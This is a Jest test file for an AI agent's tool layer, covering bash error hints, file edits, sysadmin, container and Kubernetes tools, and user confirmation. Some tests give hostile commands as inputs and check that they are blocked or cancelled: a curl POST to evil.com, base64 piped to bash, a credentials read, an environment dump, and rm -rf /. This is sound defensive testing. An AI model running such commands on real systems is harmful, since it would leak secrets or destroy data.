...
describe('tools.js', () => {
  ...
  beforeEach(() => {
    ...
    mockResolveProfile.mockImplementation((name) => { throw new Error(`Server "${name}" not found in servers.json`); });
    ...
    mockResolveDeployConfig.mockImplementation((name) => { throw new Error(`Deploy config "${name}" not found`); });
  });
  ...
  describe('enrichBashError', () => {
    ...
    it('returns original output when no hints match', () => {
      expect(enrichBashError('some random output', 'echo hello')).toBe('some random output');
    });
    ...
    it('hints for command not found (python)', () => {
      const result = enrichBashError('python3: command not found', 'python3 script.py');
      expect(result).toContain('HINT');
    ...
    it('hints for MODULE_NOT_FOUND (npm package)', () => {
      const result = enrichBashError("Cannot find module 'lodash'", 'node app.js');
      expect(result).toContain('HINT');
      expect(result).toContain('npm install lodash');
    });

    it('hints for MODULE_NOT_FOUND (relative)', () => {
      const result = enrichBashError("Cannot find module './foo'", 'node app.js');
      expect(result).toContain('HINT');
      expect(result).toContain('import path');
    });

    it('hints for permission denied', () => {
      const result = enrichBashError('EACCES: permission denied', 'node server.js');
      expect(result).toContain('HINT');
      expect(result).toContain('Permission denied');
    });

    it('hints for port already in use', () => {
      const result = enrichBashError('EADDRINUSE: address already in use :3000', 'node server.js');
      expect(result).toContain('HINT');
      expect(result).toContain('already in use');
    });

    it('hints for SyntaxError', () => {
      const result = enrichBashError('SyntaxError: Unexpected token }', 'node app.js');
      expect(result).toContain('HINT');
      expect(result).toContain('Syntax error');
    });

    it('hints for TypeScript errors', () => {
      const result = enrichBashError('error TS2304: Cannot find name "x"', 'tsc');
      expect(result).toContain('HINT');
      expect(result).toContain('TypeScript');
    });

    it('hints for Jest failures', () => {
      const result = enrichBashError('Test Suites: 1 failed, 1 total', 'npx jest');
      expect(result).toContain('HINT');
    ...
    it('hints for curl hostname resolution failure', () => {
      const result = enrichBashError('curl: (6) Could not resolve host', 'curl https://bad.example.com');
      expect(result).toContain('HINT');
      expect(result).toContain('Hostname');
    });

    it('hints for curl connection refused', () => {
      const result = enrichBashError('curl: (7) Failed to connect', 'curl https://localhost:9999');
      expect(result).toContain('HINT');
      expect(result).toContain('Service not running');
    });

    it('hints for curl HTTP error', () => {
      const result = enrichBashError('curl: (22) HTTP error', 'curl https://example.com/api');
      expect(result).toContain('HINT');
      expect(result).toContain('HTTP 4xx/5xx');
    });

    it('hints for curl timeout', () => {
      const result = enrichBashError('curl: (28) timed out', 'curl https://slow.example.com');
      expect(result).toContain('HINT');
      expect(result).toContain('timed out');
    });

    it('hints for curl SSL error', () => {
      const result = enrichBashError('curl: (35) SSL connection error', 'curl https://bad-ssl.com');
      expect(result).toContain('HINT');
      expect(result).toContain('SSL/TLS');
    });

    it('hints for SSH port forwarding failure', () => {
      const result = enrichBashError('remote port forwarding failed for listen port 8080', 'ssh -R 8080:localhost:3000 server');
      expect(result).toContain('HINT');
    ...
    it('hints for address already in use (bind)', () => {
      const result = enrichBashError('bind: Address already in use', 'ssh -L 8080:host:80 server');
      expect(result).toContain('HINT');
  ...
  describe('getBlockedHint (via bash BLOCKED)', () => {
    ...
    it('hints for cat credentials', async () => {
      const result = await executeTool('bash', { command: 'cat /path/to/credentials.json' });
      expect(result).toContain('BLOCKED');
      expect(result).toContain('HINT');
    });

    it('hints for python -c', async () => {
      const result = await executeTool('bash', { command: 'python3 -c "import os; print(os.environ)"' });
      expect(result).toContain('BLOCKED');
      expect(result).toContain('HINT');
    });

    it('hints for node -e', async () => {
      const result = await executeTool('bash', { command: 'node -e "console.log(1)"' });
      expect(result).toContain('BLOCKED');
      expect(result).toContain('HINT');
    });
  });
  ...
  describe('autoFixEdit', () => {
    ...
    it('returns null when no similar text found', () => {
      const result = autoFixEdit('hello world', 'completely different text that is very long', 'replacement');
      expect(result).toBeNull();
    });

    it('returns null when similar text is above threshold', () => {
      const result = autoFixEdit('const hello = "world";\n', 'const XXXXXXXXXX = "world";', 'replacement');
      expect(result).toBeNull();
    });

    it('returns auto-fix for close match', () => {
      const result = autoFixEdit('const hello = "world";\n', 'const helo = "world";', 'const hello = "earth";');
      if (result) {
  ...
  describe('grep output_mode and context', () => {
    ...
    it('supports context lines', async () => {
      fs.writeFileSync(path.join(tmpDir, 'ctx.js'), 'aaa\nbbb\nccc\nddd\neee\n');
      const result = await executeTool('grep', {
        pattern: 'ccc',
        path: tmpDir,
        context: 1,
  ...
  describe('edit_file strict mode', () => {
    ...
    it('strict mode with no similar text found', async () => {
      ...
      const result = await executeTool('edit_file', {
        path: fp,
        old_text: 'completely different and very long text that will not match anything at all in the file',
        new_text: 'replacement',
      });
      expect(result).toContain('ERROR');
      expect(result).toContain('strict mode');
  ...
  describe('patch_file strict mode', () => {
    ...
    it('strict mode shows similar text in error', async () => {
      ...
      const result = await executeTool('patch_file', {
        path: fp,
        patches: [{ old_text: 'const helo = "world";', new_text: 'replacement' }],
      });
      expect(result).toContain('ERROR');
      expect(result).toContain('strict mode');
      expect(result).toContain('Most similar text');
  ...
  describe('write_file chmod +x', () => {
    it('applies chmod +x to .sh files', async () => {
      ...
      const result = await executeTool('write_file', { path: fp, content: '#!/bin/bash\necho hi' });
      expect(result).toContain('Written');
    ...
    it('applies chmod +x to shebang files', async () => {
      ...
      const result = await executeTool('write_file', { path: fp, content: '#!/usr/bin/env node\nconsole.log(1)' });
      expect(result).toContain('Written');
      expect(result).toContain('chmod +x');
    });
  });
  ...
  describe('executeTool("task_list")', () => {
    beforeEach(() => {
      jest.mock('../cli/tasks', () => ({
        ...
        getTaskList: jest.fn().mockReturnValue({ name: 'test', tasks: [{ id: 'task-1', description: 'First' }] }),
    ...
    it('returns error when create missing name', async () => {
      const result = await executeTool('task_list', { action: 'create', tasks: ['a'] });
      expect(result).toContain('ERROR');
      expect(result).toContain('requires name');
    });

    it('returns error when update missing task_id', async () => {
      const result = await executeTool('task_list', { action: 'update', status: 'done' });
      expect(result).toContain('ERROR');
  ...
  describe('executeTool("switch_model")', () => {
    it('returns error for unknown model', async () => {
      const result = await executeTool('switch_model', { model: 'nonexistent-model-xyz' });
      expect(result).toContain('ERROR');
  ...
  describe('executeTool("brain_write")', () => {
    it('returns error when name is missing', async () => {
      const result = await executeTool('brain_write', { content: 'test', mode: 'create' });
      expect(result).toContain('ERROR');
      expect(result).toContain('name is required');
    });

    it('returns error when content is missing', async () => {
      const result = await executeTool('brain_write', { name: 'test', mode: 'create' });
      expect(result).toContain('ERROR');
      expect(result).toContain('content is required');
    });

    it('returns error when mode is missing', async () => {
      const result = await executeTool('brain_write', { name: 'test', content: 'hello' });
      expect(result).toContain('ERROR');
  ...
  describe('executeTool("service_manage")', () => {
    ...
    it('returns error for invalid action', async () => {
      const result = await executeTool('service_manage', { service: 'nginx', action: 'invalid' });
      expect(result).toContain('ERROR');
  ...
  describe('container tools error paths', () => {
    ...
    it('container_manage returns error without action', async () => {
      const result = await executeTool('container_manage', { container: 'test' });
      expect(result).toContain('ERROR');
      expect(result).toContain('action is required');
    });

    it('container_manage returns error for invalid action', async () => {
      const result = await executeTool('container_manage', { container: 'test', action: 'invalid' });
      expect(result).toContain('ERROR');
      expect(result).toContain('invalid action');
    });
  });
  ...
  describe('executeTool("deploy")', () => {
    ...
    it('returns error without local_path for rsync', async () => {
      const result = await executeTool('deploy', { server: 'test', remote_path: '/tmp' });
      expect(result).toContain('ERROR');
  ...
  describe('executeTool("sysadmin")', () => {
    ...
    it('returns error for unknown action', async () => {
      const result = await executeTool('sysadmin', { action: 'unknown_action' });
      expect(result).toContain('ERROR');
    ...
    it('user_manage info returns error without user', async () => {
      const result = await executeTool('sysadmin', { action: 'user_manage', user_action: 'info' });
      expect(result).toContain('ERROR');
      expect(result).toContain('user is required');
    });

    it('user_manage create returns error without user', async () => {
      const result = await executeTool('sysadmin', { action: 'user_manage', user_action: 'create' });
      expect(result).toContain('ERROR');
      expect(result).toContain('user is required');
    });

    it('user_manage delete returns error without user', async () => {
      const result = await executeTool('sysadmin', { action: 'user_manage', user_action: 'delete' });
      expect(result).toContain('ERROR');
      expect(result).toContain('user is required');
    });

    it('user_manage add_ssh_key returns error without user', async () => {
      const result = await executeTool('sysadmin', { action: 'user_manage', user_action: 'add_ssh_key' });
      expect(result).toContain('ERROR');
      expect(result).toContain('user is required');
    });

    it('user_manage add_ssh_key returns error without key', async () => {
      const result = await executeTool('sysadmin', { action: 'user_manage', user_action: 'add_ssh_key', user: 'testuser' });
      expect(result).toContain('ERROR');
      expect(result).toContain('ssh_key is required');
    });

    it('user_manage returns error for unknown user_action', async () => {
      const result = await executeTool('sysadmin', { action: 'user_manage', user_action: 'invalid' });
      expect(result).toContain('ERROR');
    ...
    it('firewall allow returns error without port', async () => {
      const result = await executeTool('sysadmin', { action: 'firewall', firewall_action: 'allow' });
      expect(result).toContain('ERROR');
      expect(result).toContain('port is required');
    });

    it('firewall deny returns error without port', async () => {
      const result = await executeTool('sysadmin', { action: 'firewall', firewall_action: 'deny' });
      expect(result).toContain('ERROR');
      expect(result).toContain('port is required');
    });

    it('firewall remove returns error without port', async () => {
      const result = await executeTool('sysadmin', { action: 'firewall', firewall_action: 'remove' });
      expect(result).toContain('ERROR');
      expect(result).toContain('port is required');
    });

    it('firewall returns error for unknown firewall_action', async () => {
      const result = await executeTool('sysadmin', { action: 'firewall', firewall_action: 'invalid' });
      expect(result).toContain('ERROR');
    ...
    it('cron add returns error without schedule', async () => {
      const result = await executeTool('sysadmin', { action: 'cron', cron_action: 'add' });
      expect(result).toContain('ERROR');
      expect(result).toContain('schedule is required');
    });

    it('cron add returns error without command', async () => {
      const result = await executeTool('sysadmin', { action: 'cron', cron_action: 'add', schedule: '0 * * * *' });
      expect(result).toContain('ERROR');
      expect(result).toContain('command is required');
    });

    it('cron remove returns error without command', async () => {
      const result = await executeTool('sysadmin', { action: 'cron', cron_action: 'remove' });
      expect(result).toContain('ERROR');
      expect(result).toContain('command');
    });

    it('cron returns error for unknown cron_action', async () => {
      const result = await executeTool('sysadmin', { action: 'cron', cron_action: 'invalid' });
      expect(result).toContain('ERROR');
    ...
    it('service returns error without service_name (except list_failed)', async () => {
      const result = await executeTool('sysadmin', { action: 'service', service_action: 'status' });
      expect(result).toContain('ERROR');
      expect(result).toContain('service_name is required');
    });

    it('service returns error for unknown service_action', async () => {
      const result = await executeTool('sysadmin', { action: 'service', service_action: 'invalid', service_name: 'nginx' });
      expect(result).toContain('ERROR');
    ...
    it('package install returns error (no packages or no pkg manager)', async () => {
      const result = await executeTool('sysadmin', { action: 'package', package_action: 'install' });
      expect(result).toContain('ERROR');
    });

    it('package remove returns error (no packages or no pkg manager)', async () => {
      const result = await executeTool('sysadmin', { action: 'package', package_action: 'remove' });
      expect(result).toContain('ERROR');
    });

    it('package update returns error (no packages or no pkg manager)', async () => {
      const result = await executeTool('sysadmin', { action: 'package', package_action: 'update' });
      expect(result).toContain('ERROR');
    });

    it('package returns error for unknown package_action (or no pkg manager)', async () => {
      const result = await executeTool('sysadmin', { action: 'package', package_action: 'invalid' });
      expect(result).toContain('ERROR');
    });
  });
  ...
  describe('bash enriched errors', () => {
    it('enriches command not found error', async () => {
      const result = await executeTool('bash', { command: 'nonexistent_command_xyz_abc_123' });
      expect(result).toContain('EXIT');
      expect(result).toContain('HINT');
      expect(result).toContain('not installed');
    });
  ...
  describe('list_directory max_depth', () => {
    it('respects max_depth parameter', async () => {
      ...
      const result = await executeTool('list_directory', { path: tmpDir, max_depth: 1 });
  ...
  describe('sysadmin read-only actions', () => {
    ...
    it('process_list with mem sort', async () => {
      const result = await executeTool('sysadmin', { action: 'process_list', sort_by: 'mem', limit: 5 });
      expect(typeof result).toBe('string');
    });

    it('disk_usage runs locally', async () => {
      const result = await executeTool('sysadmin', { action: 'disk_usage', path: tmpDir });
      expect(result.length).toBeGreaterThan(0);
    });

    it('network_status runs locally', async () => {
      const result = await executeTool('sysadmin', { action: 'network_status' });
      expect(result.length).toBeGreaterThan(0);
    });
    ...
    it('log_tail runs locally on existing file', async () => {
      ...
      const result = await executeTool('sysadmin', { action: 'log_tail', path: logFile, lines: 2 });
      expect(result).toContain('log line');
    });

    it('find_large runs locally', async () => {
      const result = await executeTool('sysadmin', { action: 'find_large', path: tmpDir, limit: 5, min_size: '1G' });
      expect(typeof result).toBe('string');
    });

    it('cron list runs locally', async () => {
      const result = await executeTool('sysadmin', { action: 'cron', cron_action: 'list' });
      expect(typeof result).toBe('string');
    });

    it('user_manage list runs locally', async () => {
      const result = await executeTool('sysadmin', { action: 'user_manage', user_action: 'list' });
      expect(typeof result).toBe('string');
    });

    it('journalctl runs locally', async () => {
      const result = await executeTool('sysadmin', { action: 'journalctl', lines: 5 });
      expect(typeof result).toBe('string');
    });

    it('journalctl with unit and priority', async () => {
      const result = await executeTool('sysadmin', { action: 'journalctl', lines: 5, unit: 'sshd', priority: 'err', since: '1 hour ago' });
      expect(typeof result).toBe('string');
    });
  });
  ...
  describe('brain_write success paths', () => {
    it('creates a new brain document', async () => {
      ...
      const readSpy = jest.spyOn(brain, 'readDocument').mockReturnValue({ content: null });
      const writeSpy = jest.spyOn(brain, 'writeDocument').mockImplementation(() => {});
      const result = await executeTool('brain_write', { name: 'test-doc', content: 'hello', mode: 'create' });
    ...
    it('returns error when creating existing document', async () => {
      const brain = require('../cli/brain');
      const readSpy = jest.spyOn(brain, 'readDocument').mockReturnValue({ content: 'existing' });
      const writeSpy = jest.spyOn(brain, 'writeDocument').mockImplementation(() => {});
      const result = await executeTool('brain_write', { name: 'test-doc', content: 'hello', mode: 'create' });
      expect(result).toContain('ERROR');
    ...
    it('updates an existing brain document', async () => {
      ...
      const readSpy = jest.spyOn(brain, 'readDocument').mockReturnValue({ content: null });
      const writeSpy = jest.spyOn(brain, 'writeDocument').mockImplementation(() => {});
      const result = await executeTool('brain_write', { name: 'test-doc', content: 'updated', mode: 'update' });
    ...
    it('appends to brain document with existing content', async () => {
      ...
      const readSpy = jest.spyOn(brain, 'readDocument').mockReturnValue({ content: 'existing' });
      const writeSpy = jest.spyOn(brain, 'writeDocument').mockImplementation(() => {});
      const result = await executeTool('brain_write', { name: 'test-doc', content: 'appended', mode: 'append' });
    ...
    it('appends to empty brain document', async () => {
      ...
      const readSpy = jest.spyOn(brain, 'readDocument').mockReturnValue({ content: null });
      const writeSpy = jest.spyOn(brain, 'writeDocument').mockImplementation(() => {});
      const result = await executeTool('brain_write', { name: 'new-doc', content: 'first content', mode: 'append' });
      expect(result).toContain('Appended');
      readSpy.mockRestore();
      writeSpy.mockRestore();
    });
  ...
  describe('task_list success paths', () => {
    beforeEach(() => {
      jest.mock('../cli/tasks', () => ({
        ...
        updateTask: jest.fn().mockReturnValue(true),
        getTaskList: jest.fn().mockReturnValue({ name: 'myplan', tasks: [{ id: 'task-1', description: 'Do thing one', status: 'pending' }] }),
  ...
  describe('switch_model success', () => {
    it('switches model when found', async () => {
      ...
      const setModelSpy = jest.spyOn(registry, 'setActiveModel').mockReturnValue(true);
      const providerSpy = jest.spyOn(registry, 'getActiveProviderName').mockReturnValue('ollama');
      const modelSpy = jest.spyOn(registry, 'getActiveModelId').mockReturnValue('qwen3-coder');

      const result = await executeTool('switch_model', { model: 'qwen3-coder' });
    ...
    it('returns error for unknown model', async () => {
      const registry = require('../cli/providers/registry');
      const setModelSpy = jest.spyOn(registry, 'setActiveModel').mockReturnValue(false);

      const result = await executeTool('switch_model', { model: 'nonexistent-model' });
      expect(result).toContain('ERROR');
      expect(result).toContain('Unknown model');
  ...
  describe('gh_workflow_trigger cancelled', () => {
    it('returns CANCELLED when user declines', async () => {
      const { confirm } = require('../cli/safety');
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool('gh_workflow_trigger', { workflow: 'test.yml' });
      expect(result).toContain('CANCELLED');
    });
  });
  ...
  describe('k8s_exec cancelled', () => {
    it('returns CANCELLED when user declines', async () => {
      const { confirm } = require('../cli/safety');
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool('k8s_exec', { pod: 'test-pod', command: 'rm -rf /', namespace: 'default' }, { autoConfirm: false });
      expect(result).toContain('CANCELLED');
    });
  });
  ...
  describe('service_manage local status', () => {
    it('runs systemctl status locally', async () => {
      const result = await executeTool('service_manage', { service: 'nonexistent-svc-xyz', action: 'status' });
  ...
  describe('service_logs local', () => {
    it('runs journalctl locally', async () => {
      const result = await executeTool('service_logs', { service: 'sshd', lines: 5 });
      // Will fail on macOS (no journalctl) but exercises code
      expect(typeof result).toBe('string');
    });

    it('runs journalctl with since flag', async () => {
      const result = await executeTool('service_logs', { service: 'sshd', since: '1 hour ago' });
      expect(typeof result).toBe('string');
    });
  });
  ...
  describe('container_logs local', () => {
    it('runs docker logs locally', async () => {
      const result = await executeTool('container_logs', { container: 'nonexistent-container-xyz' });
      expect(typeof result).toBe('string');
    });

    it('runs docker logs with since', async () => {
      const result = await executeTool('container_logs', { container: 'test', since: '1h' });
      expect(typeof result).toBe('string');
    });
  });
  ...
  describe('k8s_logs with options', () => {
    it('runs with since and container', async () => {
      const result = await executeTool('k8s_logs', { pod: 'test-pod', since: '1h', container: 'main', namespace: 'kube-system', tail: 50 });
      expect(typeof result).toBe('string');
    });
  });
  ...
  describe('k8s_apply dry_run', () => {
    it('runs dry_run without confirmation', async () => {
      const result = await executeTool('k8s_apply', { file: '/tmp/nonexistent.yaml', dry_run: true });
      expect(typeof result).toBe('string');
    });

    it('runs with namespace', async () => {
      const result = await executeTool('k8s_apply', { file: '/tmp/nonexistent.yaml', dry_run: true, namespace: 'default' });
      expect(typeof result).toBe('string');
    });
  });
  ...
  describe('k8s_rollout variations', () => {
    it('runs status (no confirmation needed)', async () => {
      const result = await executeTool('k8s_rollout', { action: 'status', deployment: 'web' });
      expect(typeof result).toBe('string');
    });
    ...
    it('runs restart (cancelled)', async () => {
      const { confirm } = require('../cli/safety');
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool('k8s_rollout', { action: 'restart', deployment: 'web' }, { autoConfirm: false });
      expect(result).toContain('CANCELLED');
    });
    ...
    it('runs undo (cancelled)', async () => {
      const { confirm } = require('../cli/safety');
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool('k8s_rollout', { action: 'undo', deployment: 'web' }, { autoConfirm: false });
      expect(result).toContain('CANCELLED');
    });
  });
  ...
  describe('deploy with config', () => {
    it('returns error for nonexistent config', async () => {
      const result = await executeTool('deploy', { config: 'nonexistent-config-xyz' });
      expect(result).toContain('ERROR');
    });
  });
  ...
  describe('container_manage variations', () => {
    it('inspect runs without confirmation', async () => {
      const result = await executeTool('container_manage', { container: 'test-xyz', action: 'inspect' });
      expect(typeof result).toBe('string');
    });
    ...
    it('stop is cancelled', async () => {
      const { confirm } = require('../cli/safety');
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool('container_manage', { container: 'test', action: 'stop' }, { autoConfirm: false });
      expect(result).toContain('CANCELLED');
    });

    it('remove action maps to docker rm', async () => {
      const result = await executeTool('container_manage', { container: 'test-xyz-nonexistent', action: 'remove' });
      expect(typeof result).toBe('string');
    });
  });
  ...
  describe('container_exec safe commands', () => {
    it('runs safe command without confirmation', async () => {
      const result = await executeTool('container_exec', { container: 'test-xyz', command: 'echo hello' });
      expect(typeof result).toBe('string');
    });
  });
  ...
  describe('sysadmin service actions', () => {
    it('service status runs locally', async () => {
      const result = await executeTool('sysadmin', { action: 'service', service_action: 'status', service_name: 'sshd' });
      expect(typeof result).toBe('string');
    });

    it('service list_failed runs without service_name', async () => {
      const result = await executeTool('sysadmin', { action: 'service', service_action: 'list_failed' });
      expect(typeof result).toBe('string');
    });

    it('service_name adds .service suffix', async () => {
      const result = await executeTool('sysadmin', { action: 'service', service_action: 'status', service_name: 'nginx' });
      expect(typeof result).toBe('string');
    });

    it('service_name with .service keeps it', async () => {
      const result = await executeTool('sysadmin', { action: 'service', service_action: 'status', service_name: 'nginx.service' });
      expect(typeof result).toBe('string');
    });
  });
  ...
  describe('sysadmin firewall status', () => {
    it('firewall status runs locally', async () => {
      const result = await executeTool('sysadmin', { action: 'firewall', firewall_action: 'status' });
      expect(typeof result).toBe('string');
    });
  });
  ...
  describe('sysadmin package list', () => {
    it('runs package list locally', async () => {
      const result = await executeTool('sysadmin', { action: 'package', package_action: 'list' });
      expect(typeof result).toBe('string');
    });

    it('package upgrade exercises path', async () => {
      const result = await executeTool('sysadmin', { action: 'package', package_action: 'upgrade' });
      expect(typeof result).toBe('string');
    });
  });
  ...
  describe('sysadmin user_manage info', () => {
    it('runs user info locally', async () => {
      const result = await executeTool('sysadmin', { action: 'user_manage', user_action: 'info', user: process.env.USER || 'root' });
      expect(typeof result).toBe('string');
    });
  });
  ...
  describe('web_search with Perplexity', () => {
    ...
    it('falls back to DuckDuckGo when Perplexity fails', async () => {
      ...
      jest.spyOn(axios, 'post').mockRejectedValueOnce(new Error('Perplexity API error'));
      jest.spyOn(axios, 'get').mockResolvedValueOnce({
  ...
  describe('enrichBashError backup pattern', () => {
    ...
    it('warns about double backup pattern', () => {
      const result = enrichBashError('error', 'for f in *.txt; do cp $f $f.bak; sed -i.bak "s/a/b/" $f; done');
      expect(result).toContain('HINT');
  ...
  describe('ask_user with handler', () => {
    ...
    it('uses custom handler when set', async () => {
      ...
      const result = await executeTool('ask_user', { question: 'What color?', options: ['red', 'blue'] });
  ...
  describe('browser tools mocked', () => {
    ...
    it('browser_navigate returns formatted result', async () => {
      ...
      const result = await executeTool('browser_open', { url: 'https://example.com' });
    ...
    it('browser_navigate handles error', async () => {
      mockBrowserNavigate.mockRejectedValue(new Error('Playwright not installed'));
      const result = await executeTool('browser_open', { url: 'https://example.com' });
      expect(result).toContain('ERROR');
    ...
    it('browser_navigate with no links', async () => {
      mockBrowserNavigate.mockResolvedValue({
        title: 'Page', url: 'https://x.com', text: 'content', links: [],
      });
      const result = await executeTool('browser_open', { url: 'https://x.com' });
    ...
    it('browser_screenshot returns path', async () => {
      ...
      const result = await executeTool('browser_screenshot', { url: 'https://example.com' });
    ...
    it('browser_click returns result', async () => {
      ...
      const result = await executeTool('browser_click', { url: 'https://example.com', selector: '#btn' });
    ...
    it('browser_fill returns result', async () => {
      ...
      const result = await executeTool('browser_fill', { url: 'https://example.com', selector: '#input', value: 'test' });
  ...
  describe('ssh tool validation', () => {
    ...
    it('ssh_download requires all params', async () => {
      const result = await executeTool('ssh_download', { server: 'myserver', remote_path: '/tmp/x' });
      expect(result).toContain('ERROR');
      expect(result).toContain('local_path');
    });
  });
  ...
  describe('service_manage validation', () => {
    ...
    it('non-status action is cancelled', async () => {
      const { confirm } = require('../cli/safety');
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool('service_manage', { service: 'nginx', action: 'restart' }, { autoConfirm: false });
      expect(result).toContain('CANCELLED');
    });
  });
  ...
  describe('container_exec validation', () => {
    ...
    it('destructive command cancelled', async () => {
      const { confirm } = require('../cli/safety');
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool('container_exec', { container: 'test', command: 'rm -rf /' }, { autoConfirm: false });
      expect(result).toContain('CANCELLED');
    });
  });
  ...
  describe('deploy validation', () => {
    ...
    it('requires local_path for rsync', async () => {
      const result = await executeTool('deploy', { server: 'myserver', remote_path: '/app', method: 'rsync' });
      expect(result).toContain('ERROR');
    });
  });
  ...
  describe('sysadmin user_manage', () => {
    ...
    it('user_manage unknown action', async () => {
      const result = await executeTool('sysadmin', { action: 'user_manage', user_action: 'unknown_action' });
      expect(result).toContain('ERROR');
      expect(result).toContain('Unknown user_action');
    });
  });
  ...
  describe('sysadmin firewall', () => {
    ...
    it('firewall unknown action', async () => {
      const result = await executeTool('sysadmin', { action: 'firewall', firewall_action: 'unknown' });
      expect(result).toContain('ERROR');
      expect(result).toContain('Unknown firewall_action');
    });
  });
  ...
  describe('sysadmin cron', () => {
    ...
    it('cron add requires command', async () => {
      const result = await executeTool('sysadmin', { action: 'cron', cron_action: 'add', schedule: '* * * * *' });
      expect(result).toContain('ERROR');
      expect(result).toContain('command');
    });
    ...
    it('cron unknown action', async () => {
      const result = await executeTool('sysadmin', { action: 'cron', cron_action: 'unknown' });
      expect(result).toContain('ERROR');
      expect(result).toContain('Unknown cron_action');
    });
  });
  ...
  describe('sysadmin find_large', () => {
    it('runs find_large locally', async () => {
      const result = await executeTool('sysadmin', { action: 'find_large', path: tmpDir, min_size: '1G', limit: 5 });
      expect(typeof result).toBe('string');
    });
  });
  ...
  describe('sysadmin service', () => {
    ...
    it('unknown service_action', async () => {
      const result = await executeTool('sysadmin', { action: 'service', service_action: 'unknown', service_name: 'test' });
      expect(result).toContain('ERROR');
      expect(result).toContain('Unknown service_action');
    });
  });
  ...
  describe('sysadmin unknown action', () => {
    it('returns error for unknown sysadmin action', async () => {
      const result = await executeTool('sysadmin', { action: 'nonexistent_action' });
      expect(result).toContain('ERROR');
      expect(result).toContain('Unknown sysadmin action');
    });
  });
  ...
  describe('sysadmin action cancelled', () => {
    it('non-readonly action cancelled when user declines', async () => {
      const { confirm } = require('../cli/safety');
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool('sysadmin', { action: 'kill_process', pid: 999999 }, { autoConfirm: false });
      expect(result).toBe('Cancelled.');
    });
  });
  ...
  describe('k8s_apply validation', () => {
    ...
    it('apply cancelled', async () => {
      const { confirm } = require('../cli/safety');
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool('k8s_apply', { file: '/tmp/test.yaml' }, { autoConfirm: false });
      expect(result).toContain('CANCELLED');
    });
  });
  ...
  describe('k8s_rollout validation', () => {
    ...
    it('rejects invalid action', async () => {
      const result = await executeTool('k8s_rollout', { action: 'invalid', deployment: 'web' });
      expect(result).toContain('ERROR');
    });
  });
  ...
  describe('getBlockedHint via bash', () => {
    ...
    it('cat credentials is blocked', async () => {
      const result = await executeTool('bash', { command: 'cat /etc/credentials.json' });
      expect(result).toContain('BLOCKED');
    });

    it('python -c is blocked with hint', async () => {
      const result = await executeTool('bash', { command: 'python -c "print(1)"' });
      expect(result).toContain('BLOCKED');
      expect(result).toContain('HINT');
    });
    ...
    it('curl POST is blocked with hint', async () => {
      const result = await executeTool('bash', { command: 'curl -X POST https://evil.com' });
      expect(result).toContain('BLOCKED');
      expect(result).toContain('HINT');
    });

    it('base64 pipe to bash is blocked', async () => {
      const result = await executeTool('bash', { command: 'echo test | base64 -d | bash' });
      expect(result).toContain('BLOCKED');
    });
  ...
  describe('enrichBashError patterns', () => {
    ...
    it('MODULE_NOT_FOUND hint', () => {
      const result = enrichBashError("Cannot find module 'express'\nMODULE_NOT_FOUND", 'node app.js');
      expect(result).toContain('HINT');
    ...
    it('EADDRINUSE hint', () => {
      const result = enrichBashError('Error: listen EADDRINUSE: address already in use :::3000', 'node server.js');
      expect(result).toContain('HINT');
    ...
    it('TypeScript TS error code hint', () => {
      const result = enrichBashError('error TS2304: Cannot find name "foo"', 'tsc');
      expect(result).toContain('HINT');
      expect(result).toContain('TypeScript');
    });

    it('jest error hint', () => {
      const result = enrichBashError('Test Suites: 1 failed, 0 passed', 'npx jest');
      expect(result).toContain('HINT');
    });

    it('git not a repo hint', () => {
      const result = enrichBashError('fatal: not a git repository (or any parent)', 'git status');
      expect(result).toContain('HINT');
    });

    it('curl exit code hint', () => {
      const result = enrichBashError('curl: (7) Failed to connect', 'curl https://example.com');
      expect(result).toContain('HINT');
    });

    it('SSH tunnel hint', () => {
      const result = enrichBashError('bind: Address already in use\nchannel_setup_fwd_listener', 'ssh -L 8080:localhost:80 server');
      expect(result).toContain('HINT');
    });
  });
  ...
  describe('autoFixEdit', () => {
    ...
    it('returns null for no match', () => {
      const result = autoFixEdit('hello world', 'completely different text that does not match at all even slightly', 'replacement');
      expect(result).toBeNull();
    });
    ...
    it('fixes close match within threshold', () => {
      ...
      const result = autoFixEdit(content, 'function doSomthng() {', 'function doSomethingNew() {');
      if (result) {
  ...
  describe('list_directory with pattern', () => {
    ...
    it('returns error for nonexistent directory', async () => {
      const result = await executeTool('list_directory', { path: '/nonexistent-dir-xyz-123' });
      expect(result).toContain('ERROR');
    });
  });
  ...
  describe('read_file with offset/limit', () => {
    it('reads with offset and limit', async () => {
      ...
      fs.writeFileSync(fp, 'line1\nline2\nline3\nline4\nline5\n');
      const result = await executeTool('read_file', { path: fp, line_start: 2, line_end: 3 });
  ...
  describe('sysadmin process_list', () => {
    it('runs process_list sorted by cpu', async () => {
      const result = await executeTool('sysadmin', { action: 'process_list', sort_by: 'cpu', limit: 5 });
      expect(typeof result).toBe('string');
    });
  ...
  describe('sysadmin package validation', () => {
    ...
    it('unknown package_action', async () => {
      const result = await executeTool('sysadmin', { action: 'package', package_action: 'unknown' });
      expect(result).toContain('ERROR');
    });
  });
  ...
  describe('brain_write validation', () => {
    it('requires name', async () => {
      const result = await executeTool('brain_write', { content: 'x', mode: 'create' });
      expect(result).toContain('ERROR');
      expect(result).toContain('name');
    });

    it('requires content', async () => {
      const result = await executeTool('brain_write', { name: 'x', mode: 'create' });
      expect(result).toContain('ERROR');
      expect(result).toContain('content');
    });

    it('requires mode', async () => {
      const result = await executeTool('brain_write', { name: 'x', content: 'y' });
      expect(result).toContain('ERROR');
  ...
  describe('task_list validation', () => {
    ...
    it('create requires tasks', async () => {
      const result = await executeTool('task_list', { action: 'create', name: 'test' });
      expect(result).toContain('ERROR');
    });
  ...
  describe('search_files edge cases', () => {
    it('returns no matches when pattern not found', async () => {
      const result = await executeTool('search_files', { pattern: 'xyznonexistentpattern12345', path: tmpDir });
      expect(result).toContain('no matches');
    });
  });
  ...
  describe('ssh_exec with mocked SSH', () => {
    it('runs command successfully on remote server', async () => {
      mockResolveProfile.mockReturnValue({ host: 'test.example.com', user: 'deploy', key: '~/.ssh/id_rsa' });
      mockSshExec.mockResolvedValue({ stdout: 'hello world', stderr: '', exitCode: 0 });
